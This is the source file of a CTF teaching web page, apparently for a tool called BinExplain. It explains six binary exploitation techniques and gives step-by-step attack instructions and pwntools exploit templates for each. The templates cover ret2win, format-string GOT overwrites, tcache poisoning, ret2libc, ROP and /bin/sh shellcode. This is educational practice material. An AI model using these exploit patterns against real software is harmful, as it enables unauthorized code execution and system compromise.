import React, { useState } from 'react';

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'http://localhost:8000';

/* ──────────────────────────────────────────────────────────────────── */
/*  Category data — richer content for every category                  */
/* ──────────────────────────────────────────────────────────────────── */
const CATEGORIES = [
  {
    id: 'ret2win',
    emoji: '🏆',
    title: 'ret2win',
    color: '#238636',
    dim: 'rgba(35,134,54,0.10)',
    border: 'rgba(35,134,54,0.35)',
    difficulty: 'Beginner',
    difficultyColor: { bg: '#162c1e', border: '#2ea043', text: '#56d364' },
    tagline: 'The classic first exploit. Jump to the hidden win() function.',

    whatItIs: `ret2win ("return to win") is the simplest binary exploitation technique. 
The developer accidentally (or intentionally for a CTF) left a function called win(), flag(), 
get_flag(), or similar in the binary. This function prints the flag or spawns a shell, but 
normal execution never calls it.

Your job: overflow a local buffer on the stack to overwrite the saved return address and 
redirect execution straight to that function. No libc, no gadgets — one address, one shot.`,

    howItWorks: [
      { step: 1, title: 'Find the win function', body: 'Run: nm -a ./binary | grep -iE "win|flag|shell"\nThis lists all function names and their addresses. You want the one that prints the flag.' },
      { step: 2, title: 'Find the overflow offset', body: 'Use pwntools cyclic pattern: python3 -c "from pwn import *; print(cyclic(200))" | ./binary\nWhen it crashes, the crash address tells you exactly how many bytes until you hit the return address.' },
      { step: 3, title: 'Build the payload', body: 'Payload = [offset bytes of padding] + [8-byte win() address]\nExample: b"A" * 72 + p64(0x401234)' },
      { step: 4, title: 'Send it and collect the flag', body: 'p.sendline(payload)\np.interactive()\nYou should see the flag printed.' },
    ],

    whatToLookFor: [
      'nm -a ./binary | grep -iE "win|flag|shell" — look for any suspiciously named function',
      'objdump -d ./binary | grep -i "win" — see if the function is called anywhere in main()',
      'checksec ./binary — NX/PIE status tells you if the address is fixed or randomized',
    ],

    binexplainFinds: [
      'Win function address auto-extracted from symbol table',
      'Buffer overflow offset predicted from disassembly',
      'Pwntools template pre-filled with win() address and offset',
      'Confidence: High — detects win/flag/shell function names',
    ],

    where: 'picoCTF.org → Binary Exploitation → Easy\nPwnable.kr → fd, collision, bof\nAny CTF labeled "buffer overflow" or "get it"',

    demoName: 'ret2win_demo',
    demoSource: 'BinExplain Demo (compiled from source)',
    demoLicense: 'Freely distributable for educational use',

    exploit: `from pwn import *

p = process("./binary")
# or: p = remote("challenge.ctf.com", 1337)

win_addr = 0x401234     # from: nm -a ./binary | grep win
offset   = 72           # from: cyclic pattern crash test

payload = b"A" * offset + p64(win_addr)
p.sendline(payload)
p.interactive()`,
  },

  {
    id: 'format_string',
    emoji: '📝',
    title: 'format_string',
    color: '#d2a8ff',
    dim: 'rgba(210,168,255,0.10)',
    border: 'rgba(210,168,255,0.35)',
    difficulty: 'Easy / Medium',
    difficultyColor: { bg: '#271b3b', border: '#8957e5', text: '#d2a8ff' },
    tagline: 'Read memory with %p, write anywhere with %n.',

    whatItIs: `A format string vulnerability occurs when user input is passed directly to printf() 
as the format argument — printf(user_input) instead of printf("%s", user_input).

Format specifiers like %p, %x, %s, %n are not just for display. When the attacker controls 
the format string, they can:
  • Leak memory: %p prints a pointer value from the stack
  • Read arbitrary memory: %s dereferences a pointer and prints what it points to  
  • Write arbitrary memory: %n writes the number of printed characters to an address

This means one vulnerable printf() call can leak stack addresses, leak libc base, 
leak canary values, and overwrite GOT entries — all without a buffer overflow.`,

    howItWorks: [
      { step: 1, title: 'Confirm the vulnerability', body: 'Send: %p.%p.%p.%p to the program input\nIf you see 0x... hex values printed, the vulnerability exists.' },
      { step: 2, title: 'Find the format string offset', body: 'pwntools FmtStr automatically finds which stack position your input starts:\n  from pwn import *\n  def exec_fmt(payload):\n      p = process("./binary"); p.sendline(payload); return p.recvall()\n  autofmt = FmtStr(exec_fmt)\n  print("Offset:", autofmt.offset)' },
      { step: 3, title: 'Leak a useful address', body: 'Use positional format: %6$p prints the value at stack position 6\nLeak a libc address from the GOT by printing the value of a known function pointer.' },
      { step: 4, title: 'Overwrite a GOT entry', body: 'Use fmtstr_payload() to overwrite a function pointer (like exit() or puts()) with win():\n  payload = fmtstr_payload(offset, {elf.got["exit"]: elf.symbols["win"]})' },
    ],

    whatToLookFor: [
      'python3 -c \'print("%p."*20)\' | ./binary — if you see hex values, it\'s vulnerable',
      'objdump -d ./binary | grep -B2 printf — is printf called with one argument (the user buffer)?',
      'readelf -r ./binary — lists the GOT table; pick a target function to overwrite',
    ],

    binexplainFinds: [
      'printf() called without format argument detected in disassembly',
      'GOT table extracted (potential overwrite targets)',
      'AI hints suggest fmtstr_payload usage with offset pre-calculated',
      'Kill chain: leak → calculate → overwrite flow explained',
    ],

    where: 'CTFtime.org → filter by pwn → look for "format string" tag\nMetaCTF Flash CTFs — "Schooled" is a real example\npicoCTF → "format string" challenges',

    demoName: 'schooled',
    demoSource: 'MetaCTF Flash CTF — "Schooled"',
    demoLicense: 'Public CTF challenge, freely distributable',

    exploit: `from pwn import *

p = process("./binary")

# Step 1: confirm — does %p leak anything?
p.sendline(b"%p.%p.%p.%p")
print(p.recvline())

# Step 2: find offset with FmtStr
def exec_fmt(payload):
    p = process("./binary")
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# Step 3: overwrite exit() GOT entry → win()
elf = ELF("./binary")
payload = fmtstr_payload(offset, {elf.got["exit"]: elf.symbols["win"]})
p.sendline(payload)
p.interactive()`,
  },

  {
    id: 'heap_exploitation',
    emoji: '🏗️',
    title: 'heap_exploitation',
    color: '#ff8b4d',
    dim: 'rgba(255,139,77,0.10)',
    border: 'rgba(255,139,77,0.35)',
    difficulty: 'Hard',
    difficultyColor: { bg: '#3c1e1e', border: '#f85149', text: '#ff7b72' },
    tagline: 'Corrupt heap metadata to control what malloc() returns.',

    whatItIs: `The heap is a region of memory used by malloc() and free() for dynamic allocation. 
The heap allocator (glibc's ptmalloc) keeps linked lists of free chunks so it can reuse them. 
Each free chunk has a header containing metadata like its size and a forward pointer (fd) to 
the next free chunk.

Heap exploitation works by corrupting this metadata so malloc() returns an attacker-controlled 
address. When the program then writes to that address (thinking it's a fresh allocation), 
it overwrites something critical — a function pointer, a GOT entry, a hook.

Common heap bugs:
  • Use-after-free (UAF): reading/writing a pointer after free()
  • Double-free: calling free() twice on the same chunk  
  • Heap overflow: writing past the end of a chunk into the next one's header`,

    howItWorks: [
      { step: 1, title: 'Identify the heap bug type', body: 'Look for menu-driven programs (Add / Delete / Edit / View). Try:\n  - Allocate chunk A, free chunk A, use chunk A again → UAF\n  - Allocate chunk A, free chunk A, free chunk A again → double-free\n  - Write more than the allocated size into a chunk → overflow' },
      { step: 2, title: 'Corrupt chunk metadata', body: 'For tcache poisoning (glibc 2.32+):\n  free(chunk)        # add to tcache freelist\n  edit(chunk, p64(target))  # overwrite fd pointer\nFor glibc < 2.32: double-free to corrupt fd without mangling.' },
      { step: 3, title: 'Allocate into target', body: 'malloc() twice — first returns the corrupted chunk, \nsecond returns your target address.\ntarget_chunk = malloc(size)  # → target_address' },
      { step: 4, title: 'Write to target', body: 'Write a win() address into __free_hook, __malloc_hook, or a GOT entry.\nCall free() or malloc() again to trigger the overwritten hook.' },
    ],

    whatToLookFor: [
      'nm -a ./binary | grep malloc — confirms heap usage',
      'strings ./binary | grep -iE "add|delete|edit|view|alloc|free" — menu pattern',
      'objdump -d ./binary | grep -A5 free — where is free() called? Is the pointer reused afterwards?',
    ],

    binexplainFinds: [
      'malloc()/free() calls detected and flagged',
      'Menu structure pattern identified from binary strings',
      'AI hints reference the glibc version and appropriate technique',
      'Confidence: Medium (requires manual confirmation of UAF/double-free logic)',
    ],

    where: 'HackTheBox → Challenges → Pwn → Medium/Hard\nCTFtime.org → hard pwn challenges with menu programs\nPwnable.tw — harder, classic heap challenges',

    demoName: 'heap_demo',
    demoSource: 'BinExplain Demo (how2heap pattern)',
    demoLicense: 'Freely distributable for educational use',

    exploit: `from pwn import *

p = process("./binary")

# Tcache poisoning skeleton (glibc 2.31+)
def alloc(size, data=b""):
    p.sendlineafter(b"Choice:", b"1")
    p.sendlineafter(b"Size:", str(size).encode())
    p.sendafter(b"Data:", data)

def delete(idx):
    p.sendlineafter(b"Choice:", b"2")
    p.sendlineafter(b"Index:", str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b"Choice:", b"3")
    p.sendlineafter(b"Index:", str(idx).encode())
    p.sendafter(b"Data:", data)

# 1. Create two chunks
alloc(32, b"AAAA")    # chunk 0
alloc(32, b"BBBB")    # chunk 1 (prevents consolidation with top)

# 2. Free chunk 0 into tcache
delete(0)

# 3. UAF: overwrite fd pointer with target address
target = 0x404060   # e.g. __free_hook address
edit(0, p64(target))

# 4. Allocate twice
alloc(32)    # pops chunk 0 from tcache
alloc(32, p64(win_addr))  # pops target — writes win() to *target

p.interactive()`,
  },

  {
    id: 'ret2libc',
    emoji: '🐚',
    title: 'ret2libc',
    color: '#58a6ff',
    dim: 'rgba(88,166,255,0.10)',
    border: 'rgba(88,166,255,0.35)',
    difficulty: 'Medium',
    difficultyColor: { bg: '#1c2d4a', border: '#388bfd', text: '#79c0ff' },
    tagline: 'Leak libc base, then call system("/bin/sh").',

    whatItIs: `ret2libc is the standard attack when NX is enabled (you cannot inject shellcode) 
and there is no win() function. The plan: use libc — the C standard library that every Linux 
program links against — specifically its system() function which can spawn a shell.

The challenge: libc loads at a random base address (ASLR). You must first leak a libc address 
at runtime, then calculate system() and "/bin/sh" offsets from the leak.

Two-stage attack:
  Stage 1: Use a ROP gadget (pop rdi; ret) to call puts(puts@GOT) — this prints libc's address 
           of puts(), revealing where libc loaded.
  Stage 2: Calculate system() = puts_leak - libc.sym["puts"] + libc.sym["system"]
           Then call system("/bin/sh") to get a shell.`,

    howItWorks: [
      { step: 1, title: 'Find the pop rdi; ret gadget', body: 'ROPgadget --binary ./binary | grep "pop rdi"\nThis gadget lets you set the first function argument (rdi register) to any value.' },
      { step: 2, title: 'Leak a libc address', body: 'Build payload to call puts(puts@GOT):\n  payload = b"A"*offset + p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(main)\nThis prints puts\'s real libc address, then returns to main() for stage 2.' },
      { step: 3, title: 'Calculate libc base', body: 'leak = u64(p.recvuntil(b"\\n").strip().ljust(8, b"\\x00"))\nlibc_base = leak - libc.sym["puts"]' },
      { step: 4, title: 'Call system("/bin/sh")', body: 'system_addr = libc_base + libc.sym["system"]\nbin_sh = libc_base + next(libc.search(b"/bin/sh"))\npayload2 = b"A"*offset + p64(ret_gadget) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)\np.sendline(payload2)' },
    ],

    whatToLookFor: [
      'checksec ./binary — NX=Enabled, no canary means ret2libc is likely',
      'ROPgadget --binary ./binary | grep "pop rdi" — you need this gadget',
      'nm -a ./binary | grep puts — if puts is imported, you can leak with it',
      'Find the libc version: ldd ./binary then look up the version hash on libc.rip',
    ],

    binexplainFinds: [
      'PLT/GOT table fully extracted (leak candidate functions listed)',
      'pop rdi; ret gadget address auto-extracted',
      'Pwntools template with libc leak scaffold pre-filled',
      'libc version identification hint from binary metadata',
    ],

    where: 'picoCTF → Binary Exploitation → Medium\nCTFtime → pwn challenges with checksec showing NX=Enabled, Canary=No\nAny challenge where checksec shows: NX: Enabled + PIE: Disabled',

    demoName: 'ret2libc_demo',
    demoSource: 'BinExplain Demo (compiled from source)',
    demoLicense: 'Freely distributable for educational use',

    exploit: `from pwn import *

elf  = ELF("./binary")
libc = ELF("./libc.so.6")  # get from ldd ./binary
p    = process("./binary")

offset    = 72
pop_rdi   = 0x401234   # ROPgadget --binary ./binary | grep "pop rdi"
ret_gadget= 0x40101a   # needed for 16-byte stack alignment

# ── Stage 1: Leak puts() address from GOT ──────────────────────────
payload1 = (b"A" * offset
  + p64(pop_rdi)
  + p64(elf.got["puts"])
  + p64(elf.plt["puts"])
  + p64(elf.sym["main"]))
p.sendline(payload1)

leak = u64(p.recvuntil(b"\\n").strip().ljust(8, b"\\x00"))
libc_base = leak - libc.sym["puts"]
log.success(f"libc base: {libc_base:#x}")

# ── Stage 2: Call system("/bin/sh") ───────────────────────────────
system_addr = libc_base + libc.sym["system"]
bin_sh      = libc_base + next(libc.search(b"/bin/sh"))

payload2 = (b"A" * offset
  + p64(ret_gadget)
  + p64(pop_rdi)
  + p64(bin_sh)
  + p64(system_addr))
p.sendline(payload2)
p.interactive()`,
  },

  {
    id: 'rop_chain',
    emoji: '⛓️',
    title: 'rop_chain',
    color: '#8957e5',
    dim: 'rgba(137,87,229,0.10)',
    border: 'rgba(137,87,229,0.35)',
    difficulty: 'Medium / Hard',
    difficultyColor: { bg: '#281535', border: '#8957e5', text: '#d2a8ff' },
    tagline: 'Chain CPU gadgets to call execve without injecting code.',

    whatItIs: `Return-Oriented Programming (ROP) is a technique to execute arbitrary code 
without injecting any new code. Every binary contains tiny code fragments ending in "ret" 
instructions — called gadgets. Examples:
  • pop rdi; ret  — load rdi register from stack
  • pop rsi; ret  — load rsi register from stack  
  • syscall; ret  — make a Linux system call

By chaining these gadgets together on the stack, you can set up CPU registers in any 
configuration and trigger a system call or function call entirely from existing code in 
the binary or libc. NX (no-execute) is completely bypassed because you never inject 
new code — you just reuse what's already there.`,

    howItWorks: [
      { step: 1, title: 'Find usable gadgets', body: 'ROPgadget --binary ./binary --rop | grep "pop rdi"\nROPgadget --binary ./binary --rop | grep "pop rsi"\nROPgadget --binary ./binary --rop | grep "syscall"\nFor a full shell via execve: you need rdi="/bin/sh", rsi=0, rdx=0, rax=59.' },
      { step: 2, title: 'Locate "/bin/sh" string', body: 'If the binary contains "/bin/sh":\n  strings -a -t x ./binary | grep /bin/sh\nOtherwise leak libc base and use: next(libc.search(b"/bin/sh"))' },
      { step: 3, title: 'Build the chain', body: 'Stack layout (each entry is 8 bytes on x64):\n  [padding] → [pop rdi; ret] → ["/bin/sh" addr] → [pop rsi; ret] → [0] → [system()]' },
      { step: 4, title: 'Handle stack alignment', body: 'system() requires 16-byte aligned stack on x64.\nInsert a bare ret gadget before the system() call:\n  ROPgadget --binary ./binary | grep "^0x.*: ret$"' },
    ],

    whatToLookFor: [
      'checksec ./binary — NX=Enabled + Canary=No → ROP candidate',
      'ROPgadget --binary ./binary --rop | head -30 — list available gadgets',
      'ROPgadget --binary ./binary --string "/bin/sh" — does the binary contain this string?',
      'readelf -S ./binary | grep .text — how large is the code section? More code = more gadgets',
    ],

    binexplainFinds: [
      'ROP gadget scan run automatically — top gadgets listed with addresses',
      '"pop rdi; ret" highlighted if present (critical for x64 calling convention)',
      'Pwntools ROP object template generated with gadget addresses',
      'Gadget quality score: how many useful gadgets the binary exposes',
    ],

    where: 'CTFtime.org → hard pwn challenges\nHackTheBox → Pwn → Hard\nAny binary where checksec shows: NX=Enabled + Canary=Found (full protection)',

    demoName: 'rop_chain_demo',
    demoSource: 'BinExplain Demo (compiled from source)',
    demoLicense: 'Freely distributable for educational use',

    exploit: `from pwn import *

elf = ELF("./binary")
rop = ROP(elf)
p   = process("./binary")

offset = 72

# Auto-build ROP chain with pwntools
rop.call("system", [next(elf.search(b"/bin/sh\\x00"))])
log.info(rop.dump())

payload = b"A" * offset + rop.chain()
p.sendline(payload)
p.interactive()

# ── Manual approach ──────────────────────────────────────────────
# pop_rdi  = 0x401234   # ROPgadget | grep "pop rdi"
# ret      = 0x40101a   # bare ret for alignment
# bin_sh   = 0x404080   # strings -a -t x ./binary | grep /bin/sh
# system   = 0x401100   # elf.plt["system"] or libc offset
# 
# payload = b"A"*offset + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)`,
  },

  {
    id: 'shellcode',
    emoji: '💉',
    title: 'shellcode',
    color: '#f0e042',
    dim: 'rgba(240,224,66,0.10)',
    border: 'rgba(240,224,66,0.35)',
    difficulty: 'Easy (older binaries)',
    difficultyColor: { bg: '#2b2214', border: '#d29922', text: '#f0e042' },
    tagline: 'Inject your own machine code and run it directly on the stack.',

    whatItIs: `Shellcode injection is the most direct exploitation technique: you literally 
write your own machine code (shellcode) into the vulnerable buffer, then redirect execution 
to it. The program runs your code as if you compiled it yourself.

This requires NX (No-Execute) to be DISABLED — meaning the CPU is allowed to execute 
instructions from the stack. Modern systems always enable NX, so this technique mainly 
appears in:
  • Very old binaries (pre-2010 era)  
  • Deliberately vulnerable CTF binaries marked "NX disabled"
  • Challenges on Pwnable.kr or older picoCTF archives
  • Embedded/microcontroller targets

The shellcode itself is typically: execve("/bin/sh", NULL, NULL) — spawn a shell. 
pwntools ships shellcraft which generates this for any architecture.`,

    howItWorks: [
      { step: 1, title: 'Confirm NX is disabled', body: 'checksec ./binary\nLook for: NX: disabled\nIf NX is enabled, shellcode injection will not work — use ROP or ret2libc instead.' },
      { step: 2, title: 'Get the buffer address', body: 'You need to know where your shellcode will land.\nApproach 1: Disable ASLR and print the address (practice only): echo 0 > /proc/sys/kernel/randomize_va_space\nApproach 2: Leak the stack address from program output\nApproach 3: NOP sled — prepend 100-200 NOP instructions (\\x90) before shellcode to increase hit probability' },
      { step: 3, title: 'Generate shellcode', body: 'pwntools shellcraft generates correct shellcode for the target arch:\n  shellcode = asm(shellcraft.sh())\nFor ARM: context.arch = "arm"; asm(shellcraft.sh())\nFor x86 (32-bit): context.arch = "i386"; asm(shellcraft.sh())' },
      { step: 4, title: 'Send payload and catch the shell', body: 'Payload = [shellcode] + [NOP padding to offset] + [buffer address]\n  payload = shellcode + b"\\x90" * (offset - len(shellcode)) + p64(buf_addr)\np.sendline(payload)\np.interactive()  # you should get a shell' },
    ],

    whatToLookFor: [
      'checksec ./binary — NX: disabled is the only requirement',
      'objdump -d ./binary | grep -i "jmp rsp\\|call rsp" — jump-to-stack gadget makes this trivial',
      'file ./binary — architecture type (i386 vs x86-64 vs ARM changes shellcode)',
      'strings ./binary — does the program print any stack/buffer addresses? (makes ASLR moot)',
    ],

    binexplainFinds: [
      'NX status prominently flagged — "NX: Disabled → shellcode injection viable"',
      'Binary architecture detected (determines shellcode type)',
      'shellcraft.sh() code snippet pre-generated for target arch',
      'AI hint suggests NOP sled approach if ASLR status is unknown',
    ],

    where: 'picoCTF older archives (before 2018 era)\nPwnable.kr — many challenges have NX disabled\nChallenge descriptions explicitly saying "NX disabled"\nOld pwn CTF writeups from 2012–2016 era',

    demoName: 'shellcode_demo',
    demoSource: 'BinExplain Demo (compiled from source)',
    demoLicense: 'Freely distributable for educational use',

    exploit: `from pwn import *

# Tell pwntools the target architecture
context.binary = "./binary"
context.arch    = "amd64"   # or "i386" for 32-bit

p = process("./binary")

# Generate shellcode that spawns /bin/sh
shellcode = asm(shellcraft.sh())

offset   = 72
buf_addr = 0x7fffffffe000  # leaked or found via GDB

# NOP sled for reliability
nop_sled = b"\\x90" * max(0, offset - len(shellcode))
padding  = b"\\x90" * max(0, offset - len(shellcode) - len(nop_sled))

payload = shellcode + nop_sled + p64(buf_addr)
p.sendline(payload)
p.interactive()`,
  },
];

/* ──────────────────────────────────────────────────────────────────── */
/*  Small UI helpers                                                    */
/* ──────────────────────────────────────────────────────────────────── */
function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); }}
      style={{
        padding: '4px 10px', borderRadius: '5px',
        background: copied ? '#1a3a1a' : '#21262d',
        border: `1px solid ${copied ? '#3fb950' : '#30363d'}`,
        color: copied ? '#7ee787' : '#8b949e',
        fontSize: '11px', cursor: 'pointer', transition: 'all 0.15s', flexShrink: 0
      }}
    >
      {copied ? '✓ Copied' : '⎘ Copy'}
    </button>
  );
}

function StepRow({ step }) {
  const [open, setOpen] = useState(false);
  return (
    <div style={{ border: '1px solid #30363d', borderRadius: '8px', overflow: 'hidden', marginBottom: '8px' }}>
      <button
        onClick={() => setOpen(v => !v)}
        style={{
          width: '100%', display: 'flex', justifyContent: 'space-between',
          alignItems: 'center', padding: '12px 16px',
          background: open ? '#1c2d4a' : '#161b22',
          border: 'none', color: '#f0f6fc', textAlign: 'left',
          fontSize: '14px', fontWeight: 600, cursor: 'pointer', gap: '10px'
        }}
      >
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <span style={{
            width: '22px', height: '22px', borderRadius: '50%',
            background: '#388bfd22', border: '1px solid #388bfd66',
            color: '#58a6ff', fontSize: '11px', fontWeight: 800,
            display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0
          }}>{step.step}</span>
          {step.title}
        </div>
        <span style={{ color: '#8b949e', fontSize: '12px' }}>{open ? '▲' : '▼'}</span>
      </button>
      {open && (
        <div style={{
          padding: '14px 16px', background: '#0d1117',
          borderTop: '1px solid #30363d',
          fontSize: '13px', color: '#c9d1d9', lineHeight: '1.7',
          fontFamily: "'JetBrains Mono', monospace", whiteSpace: 'pre-wrap'
        }}>
          {step.body}
        </div>
      )}
    </div>
  );
}

function DemoResultPanel({ result }) {
  const [expandedStep, setExpandedStep] = useState(null);
  return (
    <div style={{ marginTop: '16px' }}>
      <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap', marginBottom: '14px', alignItems: 'center' }}>
        <span style={{ padding: '4px 10px', borderRadius: '12px', fontSize: '12px', background: '#1c2d4a', border: '1px solid #388bfd', color: '#79c0ff', fontWeight: 700 }}>
          {result.ctf_category?.category}
        </span>
        <span style={{ padding: '4px 10px', borderRadius: '12px', fontSize: '12px', background: '#382a17', border: '1px solid #d29922', color: '#f0e042' }}>
          {result.difficulty}
        </span>
        {Object.entries(result.protections || {}).map(([k, v]) => (
          <span key={k} style={{
            padding: '3px 8px', borderRadius: '10px', fontSize: '11px',
            background: (v === 'Enabled' || v === 'Full RELRO') ? '#3a0000' : '#162c1e',
            border: `1px solid ${(v === 'Enabled' || v === 'Full RELRO') ? '#f85149' : '#3fb950'}`,
            color: (v === 'Enabled' || v === 'Full RELRO') ? '#f85149' : '#56d364',
          }}>
            {k.toUpperCase()}: {v === 'Enabled' ? 'ON' : v === 'No' ? 'OFF' : v}
          </span>
        ))}
      </div>
      <div style={{ background: '#161b22', border: '1px solid #30363d', borderRadius: '6px', padding: '12px 14px', marginBottom: '14px', fontSize: '13px', color: '#c9d1d9', lineHeight: '1.6' }}>
        <div style={{ fontSize: '11px', color: '#8b949e', marginBottom: '6px', textTransform: 'uppercase', letterSpacing: '0.08em' }}>BinExplain AI Hints</div>
        {result.ai_hints}
      </div>
      <div style={{ fontSize: '12px', color: '#8b949e', marginBottom: '10px', textTransform: 'uppercase', letterSpacing: '0.06em' }}>Plain English Walkthrough</div>
      {(result.plain_english_walkthrough || []).map(step => (
        <div key={step.step} style={{ marginBottom: '6px' }}>
          <div onClick={() => setExpandedStep(expandedStep === step.step ? null : step.step)} style={{ display: 'flex', justifyContent: 'space-between', padding: '10px 14px', cursor: 'pointer', background: expandedStep === step.step ? '#1c2d4a' : '#161b22', border: '1px solid #30363d', borderRadius: expandedStep === step.step ? '6px 6px 0 0' : '6px' }}>
            <span style={{ color: '#c9d1d9', fontSize: '13px', fontWeight: 600 }}>Step {step.step}: {step.title}</span>
            <span style={{ color: '#8b949e' }}>{expandedStep === step.step ? '▲' : '▼'}</span>
          </div>
          {expandedStep === step.step && (
            <div style={{ padding: '12px 14px', background: '#0d1117', border: '1px solid #30363d', borderTop: 'none', borderRadius: '0 0 6px 6px', fontSize: '13px', color: '#c9d1d9', lineHeight: '1.6' }}>
              {step.content}
            </div>
          )}
        </div>
      ))}
      {result.pwntools_template && (
        <div style={{ marginTop: '14px' }}>
          <div style={{ fontSize: '12px', color: '#8b949e', marginBottom: '6px', textTransform: 'uppercase', letterSpacing: '0.06em' }}>Starter Exploit Script</div>
          <div style={{ background: '#0d1117', border: '1px solid #30363d', borderRadius: '6px', padding: '12px 14px', position: 'relative' }}>
            <div style={{ position: 'absolute', top: '8px', right: '8px' }}>
              <CopyButton text={result.pwntools_template} />
            </div>
            <pre style={{ color: '#79c0ff', fontSize: '12px', margin: 0, whiteSpace: 'pre-wrap', fontFamily: 'monospace' }}>{result.pwntools_template}</pre>
          </div>
        </div>
      )}
    </div>
  );
}

/* ──────────────────────────────────────────────────────────────────── */
/*  Right panel — full detail for the selected category                */
/* ──────────────────────────────────────────────────────────────────── */
function CategoryDetail({ cat, onSectionChange }) {
  const [demoLoading, setDemoLoading] = useState(false);
  const [demoResult, setDemoResult] = useState(null);
  const [demoError, setDemoError] = useState(null);
  const [showExploit, setShowExploit] = useState(false);

  const handleAnalyzeDemo = async () => {
    setDemoLoading(true);
    setDemoResult(null);
    setDemoError(null);
    try {
      const resp = await fetch(`${BACKEND_URL}/demo-analysis/${cat.demoName}`);
      if (!resp.ok) throw new Error(`Status ${resp.status}`);
      setDemoResult(await resp.json());
    } catch {
      setDemoError('Could not load demo analysis. Is the backend running?');
    } finally {
      setDemoLoading(false);
    }
  };

  return (
    <div style={{ animation: 'fadeIn 0.5s ease-out' }}>
      <style>{`@keyframes fadeIn { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:none} }`}</style>

      {/* Category header */}
      <div style={{
        background: cat.dim, border: `1px solid ${cat.border}`,
        borderRadius: '10px', padding: '20px 24px', marginBottom: '28px',
        display: 'flex', alignItems: 'center', gap: '16px'
      }}>
        <span style={{ fontSize: '40px' }}>{cat.emoji}</span>
        <div style={{ flex: 1 }}>
          <div style={{ display: 'flex', gap: '10px', alignItems: 'center', marginBottom: '4px', flexWrap: 'wrap' }}>
            <h2 style={{ margin: 0, fontSize: '22px', fontWeight: 800, color: '#f0f6fc', fontFamily: 'monospace' }}>{cat.title}</h2>
            <span style={{
              fontSize: '10px', fontWeight: 700, padding: '2px 8px', borderRadius: '4px', textTransform: 'uppercase',
              background: cat.difficultyColor.bg, border: `1px solid ${cat.difficultyColor.border}`, color: cat.difficultyColor.text
            }}>{cat.difficulty}</span>
          </div>
          <div style={{ fontSize: '14px', color: cat.color, fontWeight: 600 }}>{cat.tagline}</div>
        </div>
      </div>

      {/* What it is */}
      <div style={{ marginBottom: '28px' }}>
        <div style={{ fontSize: '11px', fontWeight: 800, color: '#8b949e', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '12px' }}>
          What is it?
        </div>
        <div style={{
          fontSize: '14px', color: '#c9d1d9', lineHeight: '1.75',
          background: '#0d1117', border: '1px solid #21262d',
          borderRadius: '8px', padding: '16px 18px',
          whiteSpace: 'pre-line'
        }}>
          {cat.whatItIs}
        </div>
      </div>

      {/* How it works — collapsible steps */}
      <div style={{ marginBottom: '28px' }}>
        <div style={{ fontSize: '11px', fontWeight: 800, color: '#8b949e', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '12px' }}>
          Step-by-step attack
        </div>
        {cat.howItWorks.map(s => <StepRow key={s.step} step={s} />)}
      </div>

      {/* What to look for */}
      <div style={{ marginBottom: '28px' }}>
        <div style={{ fontSize: '11px', fontWeight: 800, color: '#8b949e', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '12px' }}>
          How to verify on your binary
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
          {cat.whatToLookFor.map((item, i) => (
            <div key={i} style={{
              display: 'flex', gap: '10px', alignItems: 'flex-start',
              background: '#0d1117', border: '1px solid #21262d',
              borderRadius: '6px', padding: '10px 14px'
            }}>
              <span style={{ color: cat.color, flexShrink: 0, marginTop: '2px' }}>›</span>
              <code style={{ color: '#c9d1d9', fontSize: '12px', fontFamily: 'monospace', lineHeight: '1.6', wordBreak: 'break-all' }}>{item}</code>
            </div>
          ))}
        </div>
      </div>

      {/* BinExplain finds */}
      <div style={{ marginBottom: '28px' }}>
        <div style={{ fontSize: '11px', fontWeight: 800, color: '#8b949e', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '12px' }}>
          What BinExplain detects
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
          {cat.binexplainFinds.map((item, i) => (
            <div key={i} style={{ display: 'flex', gap: '8px', alignItems: 'flex-start', fontSize: '13px', color: '#c9d1d9' }}>
              <span style={{ color: '#56d364', flexShrink: 0 }}>✓</span>
              <span>{item}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Where to find challenges */}
      <div style={{ marginBottom: '28px' }}>
        <div style={{ fontSize: '11px', fontWeight: 800, color: '#8b949e', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '10px' }}>
          Where to find challenges
        </div>
        <div style={{ fontSize: '13px', color: '#58a6ff', lineHeight: '1.8', whiteSpace: 'pre-line' }}>
          {cat.where}
        </div>
      </div>

      {/* Exploit template (toggleable) */}
      <div style={{ marginBottom: '28px' }}>
        <button
          onClick={() => setShowExploit(v => !v)}
          style={{
            width: '100%', padding: '11px 16px',
            background: showExploit ? '#161b22' : '#0d1117',
            border: `1px solid ${showExploit ? cat.border : '#30363d'}`,
            borderRadius: showExploit ? '8px 8px 0 0' : '8px',
            color: showExploit ? cat.color : '#8b949e',
            fontSize: '13px', fontWeight: 700, cursor: 'pointer', textAlign: 'left',
            display: 'flex', justifyContent: 'space-between', transition: 'all 0.2s'
          }}
        >
          <span>📋 Exploit Template (pwntools)</span>
          <span>{showExploit ? '▲ Hide' : '▼ Show'}</span>
        </button>
        {showExploit && (
          <div style={{
            background: '#0d1117', border: `1px solid ${cat.border}`,
            borderTop: 'none', borderRadius: '0 0 8px 8px',
            padding: '16px', position: 'relative'
          }}>
            <div style={{ position: 'absolute', top: '10px', right: '12px' }}>
              <CopyButton text={cat.exploit} />
            </div>
            <pre style={{
              margin: 0, overflowX: 'auto',
              fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
              fontSize: '12px', color: '#7ee787', lineHeight: '1.65',
              whiteSpace: 'pre-wrap', wordBreak: 'break-all'
            }}>{cat.exploit}</pre>
